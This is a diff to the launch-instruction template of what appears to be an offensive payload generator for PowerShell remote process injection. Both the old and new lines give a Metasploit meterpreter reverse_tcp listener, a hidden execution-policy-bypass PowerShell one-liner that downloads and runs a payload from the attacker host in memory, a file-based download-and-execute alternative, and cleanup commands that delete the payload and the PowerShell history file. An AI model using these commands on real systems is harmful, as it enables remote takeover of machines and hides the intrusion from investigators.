@@ -88,14 +88,14 @@ output:
     PowerShell Remote Process Injection - Launch Instructions
 
     Start Listener:
-    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    $ msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
 
     Transfer and Execute (In-Memory):
-    powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}:8080/{{ output_file }}')"
+    $ powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}/{{ output_file }}')"
 
     Alternative (File-Based):
-    python3 -m http.server 8080
-    On target: powershell -ep bypass -c "IWR -Uri http://{{ lhost }}:8080/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
+    $ python3 -m http.server 80
+    $ powershell -ep bypass -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
 
     Notes:
     - Target process: {{ target_process }} (must be running on target)
@@ -117,5 +117,5 @@ output:
 
     Cleanup:
     On target:
-    Remove-Item {{ output_file }} -Force -ErrorAction SilentlyContinue
-    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+    $ Remove-Item {{ output_file }} -Force -ErrorAction SilentlyContinue
+    $ Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
